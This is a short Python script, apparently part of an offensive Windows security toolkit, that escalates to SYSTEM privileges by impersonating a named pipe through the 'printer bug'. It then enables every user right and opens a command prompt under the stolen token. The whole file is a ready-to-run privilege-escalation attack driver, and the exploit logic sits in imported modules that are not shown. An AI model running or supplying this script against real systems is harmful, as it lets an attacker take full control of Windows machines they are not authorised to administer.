# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

import sys
sys.path.append('../')
from utils import *
configureLogging()
from escalation import Escalation
from impersonate import Impersonate

esc = Escalation()
esc.namedPipeImpersonationSystemViaPrinterBug()
imp = Impersonate()
imp.enableAllUserRights() #Not necessary but we can do it, we do it
imp.executeCMDWithThreadEffectiveToken()
